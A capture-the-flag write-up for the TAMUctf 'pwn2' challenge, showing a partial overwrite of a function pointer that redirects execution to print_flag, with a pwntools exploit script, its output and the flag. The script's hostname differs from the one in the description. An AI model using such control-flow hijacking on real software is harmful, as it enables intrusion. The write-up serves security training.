## Pwn2 - Pwn

**Description:** ```nc pwn.tamuctf.com 4322```
**Challenge:** : pwn2
**Difficulty:** easy
**Solved by:** Neolex  

**Solution:**  
First the binary ask us a question : "Which function would you like to call?"
Let's send a lot of A's : the programs **segfault** at address **0x56555641**
the 41 is the byte we controlled in the address we call because 0x41 is the ascii value of "A".
Let's run the function print_flag which is at 0x565556d8 : 
```
gdb-peda$ p print_flag 
$1 = {<text variable, no debug info>} 0x565556d8 <print_flag>
```
so we just have to send a lot of 0xd8 to call the print_flag function : 
```python
from pwn import *

p = remote('wn.tamuctf.com', 4322)
p.sendline('\xd8'*500)
print p.recvall()
```
let's run it : 
```
$ python exploit.py
[+] Opening connection to wn.tamuctf.com on port 4322: Done
[+] Receiving all data: Done (109B)
[*] Closed connection to wn.tamuctf.com port 4322
Which function would you like to call?
This function is still under development.
gigem{4ll_17_74k35_15_0n3}
```
we got the flag !

**Flag:**  
gigem{4ll_17_74k35_15_0n3}
	
